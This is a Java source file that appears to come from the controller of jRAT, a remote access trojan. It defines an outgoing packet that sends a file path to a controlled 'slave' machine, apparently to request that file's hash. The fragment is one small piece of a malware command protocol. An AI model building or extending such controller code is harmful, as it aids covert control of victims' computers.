package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet64FileHash extends AbstractOutgoingPacket {

	private String file;

	public Packet64FileHash(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 64;
	}

}
